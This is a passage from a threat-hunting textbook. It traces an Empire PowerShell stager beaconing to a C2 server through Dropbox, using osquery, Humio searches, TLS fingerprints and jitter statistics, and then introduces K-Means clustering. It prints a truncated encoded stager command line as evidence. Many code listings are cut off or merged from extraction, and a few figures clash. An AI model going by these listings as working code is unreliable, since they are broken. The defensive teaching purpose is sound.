cmdline: "C:\Program Files (x86)\Dropbox\Client\Dropbox.exe" /syst local_address: 10.0.0.18
local_port: 61009 remote_address: 162.125.19.131 remote_port: 443
 pid: 11044 name: powershell.exe
cmdline: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.ex
    ...
    VgArACQASwApACkAfABJAEUAWAA= local_address: 10.0.0.18 local_port: 61035 remote_address: 162.125.4.14 remote_port: 443
(This output is reformatted for a better presentation.)
The output shows that a process, Dropbox.exe, established connections to two IP addresses that belong to Dropbox, 162.125.19.9 and
162.125.19.131, over port 443. The command line associated with both of them is "C:\Program Files (x86)\Dropbox\Client\Dropbox.exe"
/systemstartup. This is the standard location where the Dropbox client program gets installed, but is it a genuine Dropbox client connecting? Based on what we have seen, you might want to think twice; better safe than sorry!
Using osquery, let us capture the SHA256 hash associated with Dropbox.exe to find out if the hash value corresponds to the original code from Dropbox.
Listing 7.22 Osquery code - Retrieve the hash of processes containing dropbox.exe
SELECT 
  p.pid, p.name, p.path, p.cmdline, p.state, h.sha256 FROM
  processes p INNER JOIN hash h 
ON p.path=h.path
WHERE
  p.name LIKE "%dropbox.exe%";
Running the query on 10.0.0.18 returns the output shown in Listing 7.23.
Listing 7.23 Information about processes containing dropbox.exe
pid: 10440 name: Dropbox.exe path: C:\Program Files (x86)\Dropbox\Client\Dropbox.exe cmdline: "C:\Program Files (x86)\Dropbox\Client\Dropbox.exe" /firs status: STILL_ACTIVE
SHA256: d67c366dc4da3fe51dffdf008c6af5c91dbc24c336991fd9b3b8876de8
(This output is reformatted for a better presentation.)
A quick search using a tool like VirusTotal confirms that
d67c366dc4da3fe51dffdf008c6af5c91dbc24c336991fd9b3b8876de82262af is the SHA256 value for the genuine Dropbox.exe client file. A snapshot is shown in Figure 7.8.
Figure 7.8 VirusTotal snapshot showing the SHA256 hash value for a genuine Dropbox.exe

There is also another process, powershell.exe, establishing a connection to a Dropbox IP address, 162.125.4.14, with a PowerShell command line similar to what we have seen on endpoint 10.0.0.4.
By introducing IQR to our threat hunting expedition, we successfully uncovered two compromised machines so far, 10.0.0.4 and 10.0.0.18. We know that a PowerShell-based Empire stager has been deployed on these endpoints, allowing the endpoints to communicate with the C2 server through Dropbox.
We have captured connection information for both what looks to be legitimate Dropbox traffic and malicious ones generated by the Empire code.
It would be useful if we could analyze these connections to draw differences between the two. Identifying patterns can allow us to develop better analytics for future hunts and possibly create new detection logic.
7.1.4 Analyzing the data further
We start by analyzing all the values of time_difference_sec. For completeness, Listing 7.24 shows the Jupyter notebook code. We retrieve events, calculate time_diff_msec per src_ip, dest_ip, dest_port. We then calculate lower_quartile, upper_quartile, std1 , var1 and count1 for time_diff_msec per src_ip, dest_ip, dest_port. To gain better visibility, we do not filter the data based on the count, standard deviation, or quartiles.
Listing 7.24 Jupyter notebook code - Retrieve and process the data
import humioapi import pandas as pd
 
api = humioapi.HumioAPI(**humioapi.humio_loadenv()) stream = api.streaming_search(
    query="(@timestamp > 1663578000000) (@timestamp < 166362120000
    @sourcetype=stream:tcp OR @sourcetype=stream:udp \
    | findTimestamp(field=timestamp, as=epoch_timestamp) \
    | findTimestamp(field=endtime, as=epoch_endtime) \
    | select([epoch_timestamp, epoch_endtime, host.name, sourcetyp     repo='Threat_Hunting',     start="-30d@d",     stop="now"
)
df = pd.DataFrame(stream)
 
df = df.sort_values(by=['epoch_timestamp'], ascending=True) df['epoch_timestamp'] = df['epoch_timestamp'].astype(int) df['epoch_endtime'] = df['epoch_endtime'].astype(int) df['bytes'] = df['bytes'].astype(int) df['bytes_in'] = df['bytes_in'].astype(int) df['bytes_in'] = df['bytes_in'].astype(int)
 
df['time_diff_msec'] = df.groupby(['src_ip', 'dest_ip', \ 'dest_po df['time_diff_sec'] = df['time_diff_msec'].div(1000)
 
df['date'] = pd.to_datetime(df['epoch_timestamp'],unit='ms')
 
df['lower_quartile'] = df.groupby(['src_ip', 'dest_ip', \ 'dest_po df['upper_quartile'] = df.groupby(['src_ip', 'dest_ip', \ 'dest_po
 
df['std1'] = df.groupby(['src_ip', 'dest_ip', 'dest_port'])['time_ df['var1'] = df.groupby(['src_ip', 'dest_ip', 'dest_port'])['time_ df['count1'] = df.groupby(['src_ip', 'dest_ip', 'dest_port'])['tim
With time_diff_msec, lower_quartile, upper_quartile, std1 , var1, and count1 calculated, we can start analyzing them, starting with plotting the value of time_diff_msec for connections between 10.0.0.4 and 162.125.2.14.
Listing 7.25 Jupyter notebook code - Plot the value of time_diff_sec for connections between
10.0.0.4 and 162.125.2.14 over port 443
df.loc[(df['src_ip'] == '10.0.0.4') & (df['dest_ip'] == '162.125.2 Figure 7.9 shows the values of time_diff_sec over time.
Figure 7.9 Time difference in seconds over time for connections between 10.0.0.4 and 162.125.2.14 over port 443

We plot the same for connections between 10.0.0.18 and 162.125.2.14.
Listing 7.26 Jupyter notebook code - Plot the value of time_diff_sec for connections between
10.0.0.18 and 162.125.2.14 over port 443
df.loc[(df['src_ip'] == '10.0.0.18') & (df['dest_ip'] == '162.125.
Figure 7.10 shows the values of time_diff_sec over time.
Figure 7.10 Time difference in seconds over time for connections between 10.0.0.4 and
162.125.2.14 over port 443

Looking at the two graphs in Figures 7.9 and 7.10, we can't notice a consistent pattern. This differs from what we have seen in Chapter 6, where the time chart plot showed clear consistency in the value of time_diff_sec. Remember, jitter was not introduced then.
Let us consider another view and generate histograms showing the distribution of time_diff_sec.
Listing 7.27 Jupyter notebook code - Plot the values of time_diff_sec for connections between
10.0.0.4 and 162.125.2.14 over port 443
df.loc[(df['src_ip'] == '10.0.0.4') & (df['dest_ip'] == '162.125.2
Figure 7.11 Distribution of time_diff_sec between 10.0.0.4 and 162.125.2.14 over port 443

Listing 7.28 Jupyter notebook code - Plot the values of time_diff_sec for connections between
10.0.0.18 and 162.125.2.14 over port 443
df.loc[(df['src_ip'] == '10.0.0.18') & (df['dest_ip'] == '162.125.
Figure 7.12 Distribution of time_diff_sec between 10.0.0.18 and 162.125.2.14 over port 443

The histograms in Figures 7.11 and 7.12 show right-skewed distributions, in which most of the values are to the left and the tail is on the right side, indicating some level of consistency in the value of time_diff_sec. Compare these two histograms to the one in Figure 7.3, taken from chapter 6. In Figure 7.3, early in the chapter, there were almost no values between the two peaks.
Note
In practice, season adversaries will try to blend in to bypass detection technologies. The magnitude and techniques used differ from one attack to another. In our care, we assumed that the adversary introduced some jitter when a compromised endpoint calls home (the C2 server).
Let us summarize what we have done so far. We started by applying the same logic from Chapter 6 to a new data set, trying to prove the hypothesis: an adversary was able to take control of one or more internal hosts, which then started to beacon with jitter added to a C2 server using any TCP or UDP port. We could not prove the hypothesis, and we quickly realized we needed to modify our approach to overcome the jitter challenge. When introduced, random jitter typically results in a uniform distribution of time_diff_sec, between sleep time - jitter and sleep time + jitter. Zooming into the values that fall within IQR (and potentially other quantile ranges) allowed us to eliminate values that were far from the mean and impacted the standard deviation value, std1.
The higher the jitter, the more random time is introduced before making the next call home to a C2, resulting in a flatter distribution of time_diff_sec.
Note
Restricting the values of time_diff_sec to ones that fall within IQR will minimize the size of the data set of time_diff_sec values that we can work on. We must ensure that we have enough samples in the updated data set.
Decreasing the range to, for example, the 40th percentile to the 60th percentile will eliminate more values of time_diff_sec, resulting in a tighter distribution a hence a smaller value of std1. On the other hand, increasing the range to, for example, the 20th percentile to the 80th percentile will result in a smaller value of std1.
Note
When hunting, examine multiple ranges to capture that hidden threat. As they say, there is no size fits all. You might want to start with these ranges: 2080%, 25-75%, and 40-60%.
With all these variables and options that an adversary can change to bypass detection tools and blend in, are there other indicators we can uncover to prove the hypothesis, whether individually or combined with the standard deviation?
7.1.5 Time to hunt for patterns
To answer this question, let us explore the data by examining a sample event that captures connection information from 10.0.0.4 to a Dropbox IP address. From this event and other similar ones, we can examine fields that might help us draw patterns to profile what a malicious call home connection could look like.
Listing 7.29 Event containing information about a TCP connection between 10.0.0.4 and 162.125.2.14
"endtime":"2022-09-19T09:45:36.693065Z","timestamp":"2022-09-19T09
    ... "TLS_RSA_WITH_AES_128_CBC_SHA","TLS_RSA_WITH_3DES_EDE_CBC_
    ... "ssl_version":"3.3","tcp_status":0,"time_taken":128104,"fl
The sample event in Listing 7.29 contains metadata of a Transport Layer
Security (TLS) session between 10.0.0.4 and 162.125.2.14. The event contains a large number of fields. Let us examine a few fields to identify ones that might help us uncover some patterns.
 endtime: contains the connection end time. The feature itself is not relevant to our use case. However, we can use it along with timestamp to calculate the connection duration, which might be useful in some cases.
 timestamp: contains the connection time, with each connection would have its timestamp. The feature itself is irrelevant to our use case. However, we can use it along with endtime to calculate the connection duration.
 bytes: contains the number of bytes exchanged in a connection and is the sum of bytes_in and bytes_out. The number of bytes exchanged can be useful to identify specific traffic, making it a field of interest to analyze further.
 src_port: an ephemeral port selected by a client and decided by the underlying client operating system. In most cases, the source port does not have much significance.
 bytes_in: contains the total number of inbound bytes in a connection and can be useful to identify specific traffic, making it a field of interest to analyze further.
 app: contains the application profiled by Splunk Stream for a connection. The app field was useful in our investigation, and we can use it as an indicator by combining it with our information.
 bytes_out: contains the total number of outbound bytes in a connection and could be useful to identify specific traffic, making it a field of interest to analyze further.
 ssl_client_cipher_list: contains the numbers corresponding to the client-proposed cipher suites. The list of cipher suites supported and proposed during a connection is typically hardcoded in the client, making it a field of interest to analyze further.
 ssl_client_cipher_names: contains the client-proposed cipher suites with numbers listed in ssl_client_cipher_list. We can use one of the two fields since they represent the same thing.
Note
Sometimes, spending quality time viewing a few sample events might help you draw some patterns or raise your interest in analyzing some fields further.
Based on the above examination, we can start analyzing the most promising fields: bytes (the total bytes exchanged in a connection) and ssl_client_cipher_list (the list of cipher suite numbers proposed by the client). Let us explore these fields further in the next section.
7.1.6 Analyzing fields of interest
Let us start by examining the distribution of the values of field bytes. We will perform these searches directly on our datastore, Humio. The code in Listing 7.30 produces a distribution pie chart for the values of bytes for
connections between 10.0.0.4 and IP addresses that contain 162.125.
Listing 7.30 Humio search code - Show the distribution field bytes for connections between
10.0.0.4 and IP addresses that contain 162.125
10.0.0.4 162.125 @sourcetype=stream:tcp | groupBy("bytes")
The search produces the distribution in Figure 7.13.
Figure 7.13 Pie chart showing the distribution of bytes for connections between 10.0.0.4 and IP addresses that contain 162.125

The code in Listing 7.31 produces a distribution pie chart for the values of bytes for connections between 10.0.0.18 and IP addresses that contain 162.125.
Listing 7.31 Humio search code - Show the distribution field bytes for connections between
10.0.0.18 and IP addresses that contain 162.125
10.0.0.18 162.125 @sourcetype=stream:tcp | groupBy("bytes")
The search produces the distribution in Figure 7.14.
Figure 7.14 Pie chart showing the distribution of bytes for connections between 10.0.0.18 and IP addresses that contain 162.125

From Figures 7.13 and 7.14, we can notice that 845 is a common value for bytes in connections from the two compromised endpoints to Dropbox IP addresses. Connections with 845 bytes represent 49.3% of all connections between 10.0.0.4 and IP addresses that start with 162.125 and 18.9% of all connections between 10.0.0.18 and IP addresses that start with 162.125.
Could the malicious Dropbox beaconing connections share the same total bytes, 845? Let us explore this idea further to confirm if this is the case or not.
We first examine the ssl_client_cipher_list field. When establishing a TLS session, the client and server negotiate what cipher suites they support. The field ssl_cipher_name contains the cipher suite selected by the client and server for the TLS session.
Listing 7.32 Humio search code - List the values of fields bytes and ssl_client_cipher_list for connections between 10.0.0.4 and IP addresses that contain 162.125
10.0.0.18 162.125 @sourcetype=stream:tcp
| regex("\"ssl_client_cipher_list\":\[(?<ciphers>(.*?))\]")       
| groupBy(["ciphers", "bytes"])
| sort(_count, type=any, order=desc, limit=5)
Listing 7.33 shows the output of executing the above search.
Listing 7.33 Humio search output - List the values of fields bytes and ssl_client_cipher_list for connections between 10.0.0.4 and IP addresses that contain 162.125
ciphers: 49196,49195,49200,49199,159,158,49188,49187,49192,49191,4 bytes: 845 _count: 149
ciphers: 49196,49195,49200,49199,159,158,49188,49187,49192,49191,4 bytes: 7416 _count: 1
ciphers: 49196,49195,49200,49199,159,158,49188,49187,49192,49191,4 bytes: 71299 _count: 1
ciphers: 49196,49195,49200,49199,159,158,49188,49187,49192,49191,4 bytes: 1056 _count: 1
ciphers: 49196,49195,49200,49199,159,158,49188,49187,49192,49191,4 bytes: 9431 _count: 1
(This output is reformatted for a better presentation.)
The output shows that all events where the ssl_client_cipher_list field exists share the same value of ssl_client_cipher_list:
9196,49195,49200,49199,159,158,49188,49187,49192,49191,49162,49161 Remember, 10.0.0.4 did not have a Dropbox client running and the connections were generated by the malicious code on the endpoint.
Let us find out if this is the same case with 10.0.0.18, where a Dropbox client and the malicious code were running and connecting to IP addresses that belong to Dropbox.
Listing 7.34 Humio search output - List the values of fields bytes and ssl_client_cipher_list for connections between 10.0.0.18 and IP addresses that contain 162.125
10.0.0.18 162.125 @sourcetype=stream:tcp
| regex("\"ssl_client_cipher_list\":\[(?<ciphers>(.*?))\]")
| groupBy(["ciphers", "bytes"])
| sort(_count, type=any, order=desc, limit=5)
Listing 7.35 shows the output of executing the above search.
Listing 7.35 Humio search output - List the values of fields bytes and ssl_client_cipher_list for connections between 10.0.0.4 and IP addresses that contain 162.125
ciphers: 49196,49195,49200,49199,159,158,49188,49187,49192,49191,4 bytes: 845 _count: 168
ciphers: 49196,49195,49200,49199,159,158,49188,49187,49192,49191,1 bytes: 854 _count: 65
ciphers: 49196,49195,49200,49199,159,158,49188,49187,49192,49191,1 bytes: 849 _count: 53
ciphers: 49196,49195,49200,49199,159,158,49188,49187,49192,49191,1 bytes: 852 _count: 42
ciphers: 49196,49195,49200,49199,159,158,49188,49187,49192,49191,1 bytes: 850 _count: 42
(This output is reformatted for a better presentation.)
The output shows that events where the value of bytes is 845 and the ssl_client_cipher_list field exists share the same value of ssl_client_cipher_list:
9196,49195,49200,49199,159,158,49188,49187,49192,49191,49162,49161 similar to connections from 10.0.0.4. While events with different values of bytes share a different ssl_client_cipher_list:
49196,49195,49200,49199,159,158,49188,49187,49192,49191,157,156,61
We can conclude, with high probability, that beaconing connections from the malicious code use 845 total bytes in each TLS connection, and that the following set of cipher suites proposed in the TLS client hello message:
9196,49195,49200,49199,159,158,49188,49187,49192,49191,49162,49161 Let us recap what we have done so far to reach this conclusion: we looked at connection events, performed searches, generated distributions, compared values, and connected the dots to discover some level of correlation. What if this correlation, and potentially others, could have been uncovered by machines instead of humans? In the coming chapters, we will introduce you to machine learning and how to use it to uncover patterns of interest.
Note
An sophisticated adversary can play around with the parameters we have been looking at to overcome your logic, so be prepared. For example, the adversary can add more randomness to the time jitter, total bytes, and the proposed client cipher suits for the call home connections.
At this stage of the hunt, we might have forgotten that there is another destination IP address, 40.87.160.0, that we need to investigate. Let us do this now.
7.1.7 Interrogating the second suspect, 40.87.160.0
We start by looking at a sample event containing 40.87.160.0 as a destination IP address. Listing 7.36 shows a TCP connection from 10.0.0.15 to 40.87.160.0, with a destination port of 23456. The total bytes exchanged in this connection is 140. The app field is set to unknown, meaning that Splunk stream could not profile traffic for this connection and map it to an application profile it knows. The snapshot also shows no outbound data packets; the data_packets_out field is set to 0.
Listing 7.36 Event containing information about a TCP connection between 10.0.0.15 and
40.87.160.0
{"endtime":"2022-09-19T20:58:39.822638Z","timestamp":"2022-09-19T2
Let us search our datastore to find out which endpoints in the network connect to 40.87.160.0 and which destination port they use when connecting.
Listing 7.37 Humio search code - Find source IP addresses and destination ports for connections to 40.87.160.0
@sourcetype=stream:tcp AND 40.87.160.0
| groupBy(["src_ip", "dest_port", "bytes", "data_packets_out"])
Listing 7.38 shows the output of running the search. The output shows multiple internal endpoints connect to 40.87.160.0, all using destination port 23456 and no outbound data packets. This is not something we have seen before, so at first glance, this does not seem to be normal and is certainly something worth further investigation.
Listing 7.38 Humio search output - Source IP addresses and destination ports for connections to
40.87.160.0
src_ip      dest_port   bytes   data_packets_out   _count
10.0.0.8    23456       140     0                  162 10.0.0.9    23456       114     0                  2 10.0.0.4    23456       140     0                  145
10.0.0.15   23456       114     0                  1
10.0.0.13   23456       114     0                  2
10.0.0.9    23456       140     0                  170
10.0.0.15   23456       140     0                  194
10.0.0.8    23456       114     0                  3
10.0.0.4    23456       114     0                  3
10.0.0.16   23456       140     0                  156
10.0.0.18   23456       140     0                  191
10.0.0.12   23456       114     0                  6
10.0.0.16   23456       114     0                  2
10.0.0.13   23456       140     0                  167
10.0.0.12   23456       140     0                  196
10.0.0.18   23456       114     0                  7
Using osquery to search for processes connecting to 40.87.160.0 does not return any results. This drives us to try to access packets to discover what is happening. For that, we make use of tcpump, a command line tool that allows you to capture, filter, and display network traffic. In this case, we ran the command on one of the endpoints, 10.0.0.8, to capture packets with port 23456 in the source or destination.
Listing 7.39 Packet dump for connections with source or destination port 23456
> tcpdump -vv port 23456                                           
05:36:55.721007 IP 40.87.160.0.23456 > host000008.2nts4aodttgerdqu
05:36:55.721007 IP host000008.2nts4aodttgerdquv4r2mqzfga.bx.intern 05:37:55.748283 IP 40.87.160.0.23456 > host000008.2nts4aodttgerdqu  
05:37:55.748283 IP host000008.2nts4aodttgerdquv4r2mqzfga.bx.intern ...
(This output is edited for brevity.)
The output shows four packets exchanged between 10.0.0.8 and
40.87.160.0. The first and second packets are related. The first is a TCP
SYN packet (Flags \[S.]) sent by 40.87.160.0 with a source port of 23456 to 10.0.0.8. The second packet is a TCP RESET packet (Flags [R]) sent by
10.0.0.8 to 40.87.160.0, indicating that 10.0.0.8 does not listen to port 23456. The third and fourth packets are related, and they are a repeat of the first and second packets. There is no service on the endpoints listening to port 23456; it is the operating system generating the TCP RESET packet.
The output in Listing 7.39 answers why the endpoint queries for
40.87.160.0 came back empty. The osquery process_open_sockets table contains processes that have open network sockets on the system.
The output packets capture contradicts the Splunk Stream events, which shows that the source IP address of the connection is local, 10.0.0.15, the destination IP address is 40.87.160.0, and the destination port is 23456. Between the Splunk Steam connection event and the packet capture output, we would trust the latter.
This is a case in which technology, Splunk Stream, presented an incorrect version of what happened, leading us to undergo additional investigation work. As a threat hunter, you will encounter such situations; you should be prepared to investigate further to discover the correct version of a story.
With this, we conclude the scenario. Let us have an exercise before we summarize the chapter.
7.2 Exercise
Access the chapter's dataset uploaded to GitHub to answer the following for connections between 10.0.0.18 and Dropbox IP addresses:
1. How many connections have been established per destination IP address? Generate an output showing the top destination IP addresses and sort in ascending order based on the count.
2. Were there other beaconing connections that were established to other IP addresses than 162.125.2.14? Refer to the patterns we uncovered in the chapter for the values of fields bytes and ssl_client_cipher_list.
3. If the answer to question 2 (above) is yes, do you notice a pattern in the destination IP address(es).
4. If the answer to question 2 (above) is yes, generate a time chart showing the value of time_diff_msec for every IP address.
7.3 Answers to exercise
1. Use a search similar to the following code for Humio. The search syntax will look different based on the tool you use.
Listing 7.40 Humio search code - Top 10 destination IP addresses starting with 162.125 communicating with 10.0.0.18
10.0.0.18 AND 162.125 | groupBy("dest_ip")
| sort(_count, order=desc, limit=10)
The search should generate the following output.
Listing 7.41 Humio search output - Top 10 destination IP addresses starting with 162.125 communicating with 10.0.0.18
dest_ip         _count 162.125.2.14    238
162.125.19.131  87
162.125.4.14    81
162.125.2.13    51
162.125.7.20    45
162.125.19.9    44
162.125.19.130  43
162.125.8.20    43
162.125.2.19    32
162.125.4.13    30
2. Use a search similar to the following code for Humio. The search syntax will look different based on the tool you use.
Listing 7.42 Humio search code - Top 10 destination IP addresses starting with 162.125 communicating with 10.0.0.18 with 845 bytes exchanged
@sourcetype=stream:tcp 10.0.0.18 AND 162.125 AND bytes=845
| regex("\"ssl_client_cipher_list\":\[(?<ciphers>(.*?))\]")
| groupBy(["dest_ip", "ciphers"])
| sort(_count, order=desc, limit=10)
The search should generate the output in Listing 7.43.
Listing 7.43 Humio search output - Top 10 destination IP addresses starting with 162.125 communicating with 10.0.0.18 with 845 bytes exchanged
dest_ip: 162.125.2.14
ciphers: 49196,49195,49200,49199,159,158,49188,49187,49192,49191,4
_count: 118 dest_ip: 162.125.4.14
ciphers: 49196,49195,49200,49199,159,158,49188,49187,49192,49191,4
_count: 40 dest_ip: 162.125.8.14 ciphers: ciphers: 49196,49195,49200,49199,159,158,49188,49187,49192,49191,4 _count: 10
(This output is reformatted for a better presentation.)
If our patterns correctly profile the beaconing connections, we can conclude with a high probability that call-home connections from 10.0.0.8 were made to other Dropbox IP addresses: 162.125.4.14 and 162.125.8.14.
3. All the destination IP addresses end with .14. Interestingly, a search on a passive DNS service, such as Cisco Umbrella, shows that edge-blockapi-env.dropbox-dns.com resolve to IPv4 addresses that end with .14, as shown in the snapshot in Figure 7.15. The other IPv4 addresses in the rest of the pages also end with .14.
Figure 7.15 A snapshot from Cisco Umbrella showing IP addresses for edge-block-apienv.dropbox-dns.com

4. Listings 7.44 show the complete Jupyter notebook code that generates the time chat plot in Figure 7.16. You need to apply this to all events regardless of the count.
Listing 7.44 Jupyter notebook code - Plot the value of time_diff_sec for connections between
10.0.0.18 and 162.125.4.14 with 845 bytes
import humioapi import pandas as pd
 
api = humioapi.HumioAPI(**humioapi.humio_loadenv()) stream = api.streaming_search(
    query="(@timestamp > 1663578000000) (@timestamp < 166362120000
    @sourcetype=stream:tcp OR @sourcetype=stream:udp \
    | findTimestamp(field=timestamp, as=epoch_timestamp) \
    | findTimestamp(field=endtime, as=epoch_endtime) \
    | select([epoch_timestamp, epoch_endtime, host.name, sourcetyp     repo='Threat_Hunting',     start="-30d@d",     stop="now"
)
df = pd.DataFrame(stream)
 
#df = df.reset_index()
 
df = df.sort_values(by=['epoch_timestamp'], ascending=True) df['epoch_timestamp'] = df['epoch_timestamp'].astype(int) df['epoch_endtime'] = df['epoch_endtime'].astype(int) df['bytes'] = df['bytes'].astype(int) df['bytes_in'] = df['bytes_in'].astype(int) df['bytes_in'] = df['bytes_in'].astype(int)
 
df['time_diff_msec'] = df.groupby(['src_ip', 'dest_ip', \ 'dest_po df['time_diff_sec'] = df['time_diff_msec'].div(1000)
 
df['date'] = pd.to_datetime(df['epoch_timestamp'],unit='ms')
 
df['lower_quartile'] = df.groupby(['src_ip', 'dest_ip', \ 'dest_po df['upper_quartile'] = df.groupby(['src_ip', 'dest_ip', \ 'dest_po
 
df['std1'] = df.groupby(['src_ip', 'dest_ip', \ 'dest_port'])['tim df['var1'] = df.groupby(['src_ip', 'dest_ip', \ 'dest_port'])['tim df['count1'] = df.groupby(['src_ip', 'dest_ip', \ 'dest_port'])['t
 df.loc[(df['src_ip'] == '10.0.0.4') & (df['dest_ip'] == '162.125.4
Figure 7.16 Time difference in seconds over time for connections between 10.0.0.18 and 162.125.4.14 with 845 bytes

Listing 7.45 contains the last line in the code with the destination IP addresses changed to 162.125.8.14.
Listing 7.45 Jupyter notebook code - Plot the value of time_diff_sec for connections between
10.0.0.18 and 162.125.8.14 with 845 bytes
df.loc[(df['src_ip'] == '10.0.0.18') & (df['dest_ip'] == '162.125.
Executing the code generates the time chat plot in Figure 7.17.
Figure 7.17 Time difference in seconds over time for connections between 10.0.0.18 and 162.125.8.14 with 845 bytes

This brings us to the end of this chapter. During the hunting expedition, we tuned existing statistical logic to tackle the jitter added by the adversary to beaconing connections made to a trusted service, Dropbox. We also uncovered patterns in data, which can further help us identify beaconing activities, enhancing our detection capabilities.
7.4 Summary
 Adversaries will try to circumvent your analytics tools. You should continuously evaluate your logic and be prepared to update it to tackle new techniques.
 Overcome confirmation bias by ensuring you get to the bottom of things before reaching a conclusion. Sophisticated adversaries would typically use out-of-bound communication channels to blend in.
 When you uncover a threat, dig deeper to collect more information. This will help you in different ways: tune threat hunting expeditions, create new detection logic, and, as we will see in the coming chapters, can be very useful to teach machines.
 Get yourself familiar with networking concepts, including the ability to capture and read network packets. In some cases, they could be your last resort to conclude what is happening in an environment.
 Technology is not perfect. Be prepared to investigate deeper to confirm a finding reported by a technology.
8 Unsupervised Machine Learning with K-Means
This chapter covers
Introducing fundamental machine learning (ML) concepts Understanding the process of applying unsupervised ML for threat hunting
 Introducing and practicing how to explore, process, and prepare data for
ML
Introducing and practicing feature selection
Encoding non-numeric fields using hot one encoding
Identifying and dealing with highly correlated features
Introducing unsupervised ML and how to apply them in threat hunting Practicing threat hunting with K-Means, to uncover clues of C2 communication in network traffic
So far, we have conducted threat-hunting expeditions based on some explicit logic (e.g., signs of beaconing by calculating the time difference between connections) and then developing searches (e.g., search commands for a datastore) or code (e.g., Python code in Jupiter Notebooks), to apply the logic on data.
In this chapter, we do the reverse: we let the data inform us about anomalies, some of which can interest threat hunters. We will apply unsupervised ML constructs to data to uncover anomalies, some of which could be malicious.
In the chapter, you will explore and process data, extract features, build unsupervised ML models using K-Means, and interpret outputs.
We explore building unsupervised ML models using K-Means, an algorithm we'll introduce later in this chapter, to uncover anomalies of interest in network connection events. Concepts in this chapter represent essential blocks to building more sophisticated ML models in the following few chapters.
You do not have to be a data scientist to effectively use ML, nor will you be one after finishing the ML chapters. You are a threat hunter who can understand and then use advanced analytics to uncover clues. You can read about specific topics in ML to gain deeper knowledge or work with data scientists and data engineers if your direct or extended (in-house or outsourced) team has the expertise.
This chapter takes you through a gentle step-by-step process to conduct an ML-driven threat hunting expedition. We introduce core concepts and use black-box deployments (existing Python libraries) of these concepts so that you do not need to write new code. The main objective is to demonstrate with examples how ML can be helpful in your search for initial clues, allowing you to understand and appreciate these core ML concepts as we progress in the chapter.
Something to keep in mind when utilizing ML: a baby learns to crawl, walk and then run. We are in the crawling stage when it comes to applying machine learning. ~Dave Waters.
There is a lot to cover in ML. So, instead of overloading you with lots of theory, let us jump straight into a threat-hunting expedition to explore what we can do with ML and learn the theory during our practice.
8.1 Again, beaconing with random jitter to a trusted destination, Dropbox
In Chapters 6 and 7, we applied statistical techniques to uncover compromised endpoints. We processed the events, calculated the standard deviation for the time difference between connections that share the same source IP, destination IP and destination port, and then looked for connections with low standard deviation values. Toward the end of Chapter 7, we uncovered some patterns in the beaconing connections:
1. The number of bytes exchanged in a beaconing connection is .
2. The TLS client proposed cipher suites differ from those used in
legitimate Dropbox connections.
Can we uncover these anomalies with the help of unsupervised ML? Let us find out. We start by defining some important ML concepts, starting with what ML is all about.
Definition
Machine learning refers to the logic that takes structured data as input to complete a task without being instructed by a programmer on how to do so, i.e., it is not a static code built with an if-then logic.
The logic is represented by an ML model, the output of applying ML algorithm(s) to a dataset. Since data drives the output, which is the model, applying an algorithm to two different datasets can generate two different models.
ML algorithms fall under one of the following categories: supervised, unsupervised, and reinforcement learning. In this chapter, we explore unsupervised ML. We will introduce the rest in the coming chapters.
Definition
Unsupervised ML refers to using mathematics to infer anomalies or patterns from data. An unsupervised ML model tries to find similarities and differences in data with no prior human intervention, i.e., it uses mathematics to learn on itself without being supervised.
Don't get mixed up between ML algorithms and models: an algorithm is applied to an input (a set of records containing records) to generate a model, which can then be used to predict or to draw similarities.
Definition
Features are inputs that ML algorithms refer to when building a model or making a decision. A feature might be extracted directly from data (e.g., extracting the URL visited by a user from a web proxy event) or calculated based on content in events (e.g., calculating the length of the URL visited by a user).
In ML, the first step in solving a problem is not to build ML models.
The first step in any ML project is to understand the data and then transform it into a set of features that allows you to build applicable ML models that can produce meaningful outputs, noting that today, machines can perform some of these steps.
Figure 8.1 shows the steps of applying unsupervised ML for threat hunting. In this process, we assume using unsupervised ML techniques such as clustering to identify potential similarities in data, if any.
Note
While ML is a robust science that allows us to probe data to uncover valuable insights that we could not do otherwise, it is not a universal solution to all problems. In many cases, more straightforward methods, such as statistics, can be more suitable and practical.
Figure 8.1 Threat hunting with unsupervised machine process

Let us assume that we have selected unsupervised ML as one of the techniques that could help us uncover threats in our expedition. The next step is to explore the data we have. Let us find out what exploring data entails in the context of ML.
8.1.1 Getting comfortable with the data
We use the same dataset from Chapter 7 to demonstrate how ML can address the same hypothesis: an adversary took control of one or more internal hosts, which then started to beacon with jitter added to a C2 server using any TCP or UDP port. We do not know the time interval between the call-home connections or the percentage of jitter added.
IMPORTANT
In our case, we seek help from a clustering algorithm, K-Means, to map events representing anomalous activities to small clusters (groups) that we can investigate.
For completeness, we revisit a raw event for a TCP network connection captured by Splunk Stream. If you recall from Chapters 6 and 7, in our setup, we have Splunk Stream monitoring network traffic, collecting connection information, creating events that describe these connections, and then forwarding the events to our datastore, Humio.
Before we load the whole dataset into our ML platform (we use a Jupyter notebook for our work), let us revisit a typical event we have to deal with.
Listing 8.1 Sample event containing information for a TCP connection between
{"endtime":"2022-09-19T20:59:05.331874Z", "timestamp":"2022-09-19T
At this stage, you can think of every field in Listing 8.1 as a potential feature for our ML model. Based on the problem you are trying to solve, not all features are helpful. For example, every event will have a different timestamp; hence, this field would not help uncover similarities between events. However, we can use it to generate a new feature that captures whether the connection was made during or outside working hours. On the other hand, the value of a field such as missing_packets_out will be the same in all events and hence would not be helpful to draw differences.
For this threat-hunting scenario, we use the same dataset from Chapter 7. A dataset that you are familiar with. If you have skipped Chapter 7, do not worry, we will load the data again in this chapter and go through the analysis steps. You can always refer to Chapter 7 if you require further details about the dataset or the malicious code we uncovered.
8.1.2 Loading the dataset
This is the first time we are reusing a dataset in the book, and for a reason: to demonstrate with an example how and when unsupervised ML would be helpful when we do not have specific indicators to search for. In Chapter 6, we searched for connections with low standard deviation, and in Chapter 7, we updated the statistical logic to capture a more sophisticated scenario.
Using the same dataset from Chapter 7, let us examine the features that we can extract.
Listing 8.2 Jupyter notebook code - Retrieve data from the datastore
import humioapi import pandas as pd
 
api = humioapi.HumioAPI(**humioapi.humio_loadenv()) stream = api.streaming_search(
    query="(@timestamp > 1663578000000) (@timestamp < 166362120000
    (@sourcetype=stream:tcp OR @sourcetype=stream:udp) \
    | findTimestamp(field=timestamp, as=epoch_timestamp) \
    | findTimestamp(field=endtime, as=epoch_endtime) \
    | select([epoch_timestamp, host.name, app,  src_ip, src_port,     repo='Threat_Hunting',     start="-7d@d",     stop="now"
)
df = pd.DataFrame(stream) df.head()
